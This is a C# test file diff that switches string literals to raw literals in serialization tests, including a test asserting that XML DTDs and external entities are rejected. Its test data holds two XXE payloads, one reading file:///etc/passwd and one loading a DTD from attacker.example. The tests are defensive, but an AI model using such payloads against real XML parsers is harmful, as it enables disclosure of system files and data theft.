@@ -145,7 +145,7 @@ public sealed class V07W56ControlledSerdeTests
         var xml = Encoding.UTF8.GetString(
             encoded.Value!.Payload.Span);
         Assert.Equal(
-            "<order id="42">hello<item>world</item></order>",
+            """<order id="42">hello<item>world</item></order>""",
             xml);
 
         var decoded = await service.DecodeAsync(
@@ -163,8 +163,8 @@ public sealed class V07W56ControlledSerdeTests
     }
 
     [Theory]
-    [InlineData("<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>")]
-    [InlineData("<!DOCTYPE x SYSTEM "https://attacker.example/evil.dtd"><x/>")]
+    [InlineData("""<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>""")]
+    [InlineData("""<!DOCTYPE x SYSTEM "https://attacker.example/evil.dtd"><x/>""")]
     public async Task Xml_dtd_and_external_entity_resolution_are_prohibited(
         string xml)
     {
@@ -300,7 +300,7 @@ public sealed class V07W56ControlledSerdeTests
             collectionResult.Failure!.Code);
 
         using var text = JsonDocument.Parse(
-            ""abcd"");
+            """"abcd"""");
         var stringResult = await service.EncodeAsync(
             new ControlledSerdeEncodeRequest(
                 ControlledSerdeFormat.Cbor,
